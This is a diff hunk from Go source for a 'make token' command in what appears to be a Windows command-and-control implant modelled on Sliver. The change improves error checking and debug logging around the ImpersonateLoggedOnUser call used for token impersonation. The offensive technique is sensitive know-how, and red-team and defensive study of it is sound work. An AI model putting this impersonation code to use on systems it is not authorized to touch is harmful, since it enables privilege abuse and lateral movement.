@@ -148,11 +148,15 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Impersonate directly using the token from LogonUser (like Sliver - NO duplication!)
 	debugLog.WriteString("[DEBUG] Calling ImpersonateLoggedOnUser...\n")
-	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(token))
-	if err != nil {
+	ret, _, _ = procImpersonateLoggedOnUser.Call(uintptr(token))
+	debugLog.WriteString(fmt.Sprintf("[DEBUG] ImpersonateLoggedOnUser returned: %d\n", ret))
+	if ret == 0 {
+		// Check the actual error
+		lastErr := windows.GetLastError()
+		debugLog.WriteString(fmt.Sprintf("[DEBUG] GetLastError: 0x%x\n", lastErr))
 		token.Close()
 		return structs.CommandResult{
-			Output:    debugLog.String() + output + fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
+			Output:    debugLog.String() + output + fmt.Sprintf("ImpersonateLoggedOnUser failed (ret=%d, lastErr=0x%x)", ret, lastErr),
 			Status:    "error",
 			Completed: true,
 		}
